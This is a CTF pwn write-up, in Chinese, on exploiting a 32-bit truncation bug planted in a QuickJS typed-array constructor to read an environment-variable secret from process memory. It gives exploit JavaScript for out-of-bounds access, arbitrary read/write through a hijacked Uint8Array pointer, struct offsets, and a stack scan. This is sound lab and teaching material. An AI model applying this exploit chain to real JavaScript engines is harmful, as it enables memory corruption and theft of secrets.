# QJS Ledger — Pinned Expression Service

```
> TPCTF 2026 · pwn · 挑战 ID `AUTHORED-0EC37D7F` · 状态 solved
```

## 一句话

QJS Ledger is the expression service behind an internal ledger tool.

## 附件

| 文件 | 大小 | sha256 |
| --- | --- | --- |
| `AUTHORED-0EC37D7F.zip` | 1.5 MB | `1a45b7015a4b…` |
| `zip/patch.diff` | 894 B | `4edb2ff4fc9e…` |

## 分析与利用

FLAG：«FLAG»

分值：动态计分

### 结果

«FLAG»

远程服务返回（连续 3 次一致）：

```
{"ok":true,"result":"QJS_CTF_FLAG=«FLAG»"}
```

### 1. 题目与协议

服务每个 TCP 连接启动一个 worker，客户端发送一行 JSON：

```
{"code":"<JavaScript source>"}
```

worker 返回：

```
{"ok":true,"result":...}
```

或：

```
{"ok":false,"error":{"name":"...","message":"..."}}
```

部署把 pinned secret 通过启动环境注入 worker，变量名为 QJS_CTF_FLAG。runner 的 C 代码只做了 getenv("QJS_CTF_FLAG") 的存在性检查并打印 present/absent，没有把值复制到任何 JS 可访问的位置。目标就是从进程内存里把这个环境变量读出来。

附件包含完整 QuickJS 2026-06-04 源码、runner、adapter 和 patch.diff。

### 2. 漏洞：64 位元素跨度被截断成 32 位

qjs_new/patch.diff 只改了一处，位于 js_typed_array_constructor：

修改前后可以简化为：

```
// before
if ((offset + (len << size_log2)) > abuf->byte_length) {
```

invalid_length:

```
JS_ThrowRangeError(ctx, "invalid length");
goto fail;
}
// after
{
uint32_t byte_span = (uint32_t)(len << size_log2);
if ((offset + byte_span) > abuf->byte_length) {
```

invalid_length:

```
JS_ThrowRangeError(ctx, "invalid length");
goto fail;
}
}
```

len << size_log2 本身是 64 位运算，但这里被强制转成 uint32_t。同时 typed_array_init 中：

```
ta->offset = offset;
ta->length = len << size_log2;
p->u.array.count = len;
p->u.array.u.ptr = abuf->data + offset;
```

ta->length 也被截断，但 p->u.array.count 保留了完整的 32 位 len。

构造：

```js
var ab = new ArrayBuffer(64);
var oob = new BigUint64Array(ab, 0, 0xE0000008);
```

• size_log2 = 3
• len << 3 = 0x700000040
• 截断后 byte_span = 0x40 = 64
• 长度检查 0 + 64 <= 64 通过
• u.array.count = 0xE0000008
• 底层 buffer 实际只有 64 字节

整数下标读取走 JS_GetPropertyValue 的快路径：

```
case JS_CLASS_BIG_UINT64_ARRAY:
if (unlikely(idx >= p->u.array.count)) goto slow_path;
return JS_NewBigUint64(ctx, p->u.array.u.uint64_ptr[idx]);
```

它只检查 idx 是否小于 count，然后直接做 64 位指针下标。typed_array_is_oob 只影响 byteLength、slice 等方法，不影响这个整数下标快路径。索引上界是 count = 0xE0000008，所以理论前向跨度是 count * 8 = 0x700000040 字节，约 28GB。

oob.length 返回 -536870904（0xE0000008 的有符号 32 位），oob.byteLength 返回 0，但 oob[i] 仍然可用。

### 3. 任意读写原语

**3.1 对象布局**

本地用同一份源码编译后，用 offsetof/sizeof 打印出的 x86-64 布局：

sizeof(JSValue) = 16

sizeof(JSObject) = 64

sizeof(JSTypedArray) = 48

sizeof(JSArrayBuffer) = 56

sizeof(JSFunctionBytecode) = 128

JSObject:

class_id           +18

shape              +24

prop               +32

u                  +40

u.typed_array      +40

u.array.u.ptr      +48

u.array.count      +56

JSTypedArray:

link               +0

obj                +16

buffer             +24

offset             +32

length             +36

track_rab          +40

JSArrayBuffer:

byte_length        +0

detached           +8

data               +16

JSFunctionBytecode:

byte_code_buf      +24

func_name          +36

realm              +72

JSContext:

rt                 +16

JSRuntime:

stack_size         +1216

stack_top          +1224

stack_limit        +1232

类 ID：

```
JS_CLASS_UINT8_ARRAY        = 23
JS_CLASS_BIG_UINT64_ARRAY   = 29
JS_CLASS_BYTECODE_FUNCTION  = 13
```

**3.2 找 victim**

先分配 OOB 数组，再分配 victim：

```js
var ab = new ArrayBuffer(64);
var oob = new BigUint64Array(ab, 0, 0xE0000008);
var ab2 = new ArrayBuffer(0x2000);
var v1 = new Uint8Array(ab2, 0, 0x2000);
```

在 OOB 窗口前部扫描 qword：

• Number(oob[k] & 0xffffffffn) === count
• j = k - 7
• Number((oob[j + 2] >> 16n) & 0xffffn) === class_id

分别得到：

```js
var j0 = find(0xE0000008, 29);  // OOB BigUint64Array 的 JSObject
var j1 = find(0x2000, 23);      // victim Uint8Array 的 JSObject
```

oob[j0 + 6] 是 OOB buffer 的 data 指针。对 victim：

```js
function setptr(p) { oob[j1 + 6] = p; }
function rd64(addr) {
setptr(addr);
var v = 0n;
for (var i = 7; i >= 0; i--) v = (v << 8n) | BigInt(v1[i]);
return v;
}
```

也就是直接改 victim JSObject 的 u.array.u.ptr。之后 v1[0..7] 就是目标地址的 8 个字节，任意读完成；需要写时同样先 setptr，再给 v1[i] 赋值。

### 4. 从任意读写到栈上的环境变量

**4.1 找 JSContext / JSRuntime**

在 OOB 窗口里扫描 class_id = 13 的 bytecode function 对象：

```js
var f = function () { return 42; };
var jf = -1;
for (var k = 2; k < 0x1000; k++) {
if (Number((oob[k] >> 16n) & 0xffffn) === 13) { jf = k - 2; break; }
}
```

由函数对象读 bytecode，再沿字段链走：

```js
var bc    = oob[jf + 5];          // u.func.function_bytecode, +40
var realm = rd64(bc + 72n);       // JSFunctionBytecode.realm
var rt    = rd64(realm + 16n);    // JSContext.rt
var st    = rd64(rt + 1224n);     // JSRuntime.stack_top
```

远程探测时 st 落在 0x7ffc...，是典型的主线程栈地址，字段链正确。

**4.2 为什么环境变量在 stack_top 上方**

runner/qjs_runner.c 的 main() 在创建 runtime 之前先调用：

```
flag = getenv("QJS_CTF_FLAG");
```

然后才 JS_NewRuntime()。JS_NewRuntime 里的 rt->stack_top 记录的是当时的 C 栈指针；argv/envp 字符串位于进程初始栈的高地址处，所以在 stack_top 上方。runner 是单线程主循环，没有把 JS 执行放到 pthread 里，因此这个 stack top 就是含环境变量的主栈。

**4.3 扫描**

从 stack_top 向上按 0x1000 字节分块扫描，块之间保留 needle.length - 1 字节重叠：

```js
var needle = "QJS_CTF_FLAG=";
```

命中后从 hit 开始读到 NUL，得到：

```
QJS_CTF_FLAG=«FLAG»
```

把这个字符串作为脚本最后一条表达式的值返回。runner 用 JS_Eval(..., JS_EVAL_TYPE_GLOBAL) 拿到 completion value，再交给闭包里的 result 序列化器，所以最终响应就是：

```
{"ok":true,"result":"QJS_CTF_FLAG=«FLAG»"}
```

### 5. 远程复现

**5.1 入口**

实例 ef537680-ac9d-473e-ab81-e2cb908ad872：

• 服务：{{INSTANCE_HOST}}:8000
• WireGuard：{{WG_ENDPOINT}}
• 隧道地址：172.16.142.254/32
• DNS：172.16.142.3

在 Windows 上导入并激活 ctfy-ef537680ac.conf 后，nslookup {{INSTANCE_HOST}} 172.16.142.3 返回 172.16.142.2，直接连 172.16.142.2:8000 即可。

**5.2 发送 exploit**

```bash
cd /d/文档/deepseek-harness/TPCTF决赛
python qjs_new/remote.py qjs_new/wbuild/exploit_remote.js
```

输出：

```
{"ok":true,"result":"QJS_CTF_FLAG=«FLAG»"}
```

remote.py 只是把 JS 文件内容包成 {"code": ...} 一行 JSON，读回一行响应。

### 6. 本地闭环验证

本地用 MinGW 编译了带漏洞的 QuickJS：

x86_64-w64-mingw32-gcc -std=gnu11 -fwrapv -funsigned-char -O1 -g \

-D_GNU_SOURCE -DCONFIG_VERSION='"2026-06-04"' -I vuln_src \

-o wbuild/harness.exe harness.c \

vuln_src/quickjs.c vuln_src/dtoa.c vuln_src/libregexp.c \

vuln_src/libunicode.c vuln_src/cutils.c -lm -lpthread

harness.c 里放了一个测试 marker：

```
volatile char marker[64];
memcpy((char *)marker, "QJS_CTF_FLAG=«FLAG»", 39);
```

wbuild/scanflag.js 用同样的 OOB → 任意读 → realm → rt → stack_top 链，在 stack_top + 0x110 找到：

```
QJS_CTF_FLAG=«FLAG»
```

这验证了扫描方向、字段偏移和任意读原语。远程只是把 marker 换成了部署注入的真实值。

### 7. 可靠性说明

• 每次 TCP 连接是新的 worker 进程，ASLR 会改变 j0、j1、jf 和绝对地址；exploit 每次重新扫描，不依赖固定地址。
• 扫描范围用 0x8000（32KB）足够覆盖环境变量；不要盲目扫 0x40000，在 Linux 上可能越过栈映射顶触发 SIGSEGV。
• QJS_CTF_FLAG= 字符串在 3 次独立连接中返回相同值，flag 稳定。
• 该利用依赖 x86-64、无 NaN boxing 的 JSValue 布局；附件构建和远程实例均满足。换架构/编译选项时需要重新测偏移。

### 8. 关键文件

• qjs_new/patch.diff — 漏洞 patch
• qjs_new/vuln_src/quickjs.c:59851 — byte_span 截断位置
• qjs_new/wbuild/exploit_remote.js — 远程 exploit 载荷
• qjs_new/remote.py — JSON Lines 客户端
• qjs_new/wbuild/scanflag.js — 本地栈扫描验证
• qjs_new/wbuild/harness.c — 本地 QuickJS embedding harness

## 结果

- flag sha256：`0c6f59acdecf961540ce2352e801f3b1f3f72b9f96c44cd46d13c6cbfe652178`, `ecc33c590ee2f7cac2de6c11c12326e492f8dbcceaee7dd82e4ea0edf3416d07`
- 明文 flag 不入库；提交记录见 `.ctf-submissions.jsonl` 或原始 WP。

## 脚本

- `solve/remote.py`

## 待核实

- 本条目由 WP 第 28 节《QJS Ledger — Pinned Expression Service》与平台附件自动合成，建议人工复核 summary 与 fingerprints。
